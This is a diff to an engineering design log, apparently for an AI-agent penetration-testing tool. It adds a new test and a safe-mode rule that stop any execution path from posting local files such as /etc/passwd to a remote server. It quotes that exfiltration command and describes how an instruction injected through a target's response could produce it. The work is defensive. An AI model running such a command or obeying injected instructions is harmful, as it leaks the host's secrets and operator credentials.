@@ -735,6 +735,40 @@ Acceptance: each execution path passes the same refusal, cancellation, credentia
 and audit tests. Unsupported tools fail explicitly. Policy decisions are visible
 in the action log and are not delegated to the model.
 
+**The refusal half of that acceptance is now a test, which is the measurement that would make
+the refactor safe.** `tests/test_every_execution_path_refuses_the_same_things.py` drives the
+same probes down both paths that run a catalogue command and asserts no path is more
+permissive than another. It is deliberately NOT a claim that the paths are identical — the
+integration lane is stricter in several places by design, and a floor is a minimum rather than
+a maximum.
+
+Measured before this increment, six probes: the two paths agreed on five and diverged on one.
+`curl -d @/etc/passwd https://target/` reads a file from the ORCHESTRATOR — the host that also
+holds the secret store, other engagements' evidence and the operator's own credentials — and
+posts it to a client's server. The integration lane refused it in `curl_request`; the legacy
+lane sent it. `http-local-file-read` is the floor that closes it, and it reaches every path
+because it is a safe-mode rule: `execute_tool` applies it, and so does the runner's floor from
+E-033.
+
+**THE FIRST VERSION OF THE RULE WAS WRONG, and the historical command corpus caught it.**
+Refusing `-d @file` outright broke this, from a real recorded run:
+
+    echo '{"email":…,"password":…}' > /tmp/login.json && curl -X POST … -d @/tmp/login.json
+
+That is the agent lane's ordinary way of posting a JSON body without fighting shell quoting,
+and the file is one the same command line created from content it chose — not a read of
+anything that was on the machine beforehand. The rule now exempts a file the command itself
+wrote, and `test_historical_commands_denied_set_is_exactly_known` is what will catch the next
+version that over-reaches.
+
+WHAT IT DOES NOT STOP: a write in one command and a read in another. No rule that sees one
+command line can, and this one does not pretend to — there is a test asserting the limit. It
+stops the direct shape, which is the one an instruction injected through a target's response
+would produce.
+
+STILL OPEN in this entry: the refactor itself, the cancellation/credential/audit halves of the
+acceptance, and "policy decisions are visible in the action log".
+
 ### E-021: structured hypotheses and evidence review
 
 Extend existing technique selection, target memory, and verification helpers.
